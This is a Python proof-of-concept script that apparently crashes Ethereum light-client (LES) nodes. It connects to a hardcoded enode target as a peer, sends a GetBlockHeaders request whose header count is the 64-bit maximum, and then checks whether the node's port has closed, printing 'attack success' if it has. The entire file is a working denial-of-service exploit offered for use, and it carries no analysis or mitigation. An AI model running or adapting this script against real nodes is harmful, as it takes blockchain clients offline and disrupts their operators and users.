import asyncio
import socket
from typing import cast
from eth_utils import decode_hex
from p2p import ecies
from p2p.kademlia import Node
from p2p.les import GetBlockHeaders, GetBlockHeadersQuery
from p2p.peer import PeerPool, LESPeer
from evm.chains.mainnet import MainnetChain,MAINNET_GENESIS_HEADER, MAINNET_VM_CONFIGURATION

def port_probe(ip,port):
    try:
        TCP_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        TCP_sock.settimeout(1)
        result = TCP_sock.connect_ex((ip, int(port)))

        if result == 0:
            return True
        else:
            return False
            TCP_sock.close()

    except socket.error as e:
        return False

def _exp(node_url,chain) -> None:

    from evm.chains.ropsten import RopstenChain, ROPSTEN_GENESIS_HEADER, ROPSTEN_VM_CONFIGURATION
    from evm.db.backends.memory import MemoryDB
    from tests.p2p.integration_test_helpers import FakeAsyncHeaderDB, connect_to_peers_loop




    ip,port = node_url.split('@')[1].split(':')
    if port_probe(ip,port):
        print('The port is open, starting to attack...')
    peer_class = LESPeer
    peer_pool = None
    if chain == 'mainnet':
        block_hash = '0xd4e56740f876aef8c010b86a40d5f56745a118d0906a34e69aec8c0db1cb8fa3'
        headerdb = FakeAsyncHeaderDB(MemoryDB())
        headerdb.persist_header(MAINNET_GENESIS_HEADER)
        network_id = MainnetChain.network_id
        nodes = [Node.from_uri(node_url)]
        peer_pool = PeerPool(peer_class, headerdb, network_id, ecies.generate_privkey(), MAINNET_VM_CONFIGURATION)
    elif chain == 'testnet':
        block_hash = '0x41941023680923e0fe4d74a34bdac8141f2540e3ae90623718e47d66d1ca4a2d'
        headerdb = FakeAsyncHeaderDB(MemoryDB())
        headerdb.persist_header(ROPSTEN_GENESIS_HEADER)
        network_id = RopstenChain.network_id
        nodes = [Node.from_uri(node_url)]
        peer_pool = PeerPool(peer_class, headerdb, network_id, ecies.generate_privkey(), ROPSTEN_VM_CONFIGURATION)
    loop = asyncio.get_event_loop()

    async def attack() -> None:
        nonlocal peer_pool
        nonlocal block_hash
        while not peer_pool.peers:
            print("Waiting for peer connection...")
            await asyncio.sleep(1)
        peer = cast(LESPeer, peer_pool.peers[0])
        cmd = GetBlockHeaders(peer.sub_proto.cmd_id_offset)
        data = {
            'request_id': 1,
            'query': GetBlockHeadersQuery(decode_hex(block_hash), 1, 0xffffffffffffffff, False),
        }
        header, body = cmd.encode(data)
        peer.sub_proto.send(header, body)
        await asyncio.sleep(1)
        result = port_probe(ip, port)
        if not result:
            print('The port is closed,attack success ...')
            exit()



    t1 = asyncio.ensure_future(connect_to_peers_loop(peer_pool, nodes))
    t2 = asyncio.ensure_future(attack())
    loop.set_debug(True)
    loop.run_until_complete(asyncio.wait([t1,t2]))
    loop.close()



if __name__ == '__main__':
    node_url = "enode://59cda24968004b08a5ebbaf9da85d29107a4aad79db6b9b88a87de7749e60c4655727e9015648635b3b62b5b0a7e930580ddfe922f3577530898f72a65ebc57a@172.31.233.101:30303"
    chain = 'testnet' #testnet or mainnet
    _exp(node_url,chain)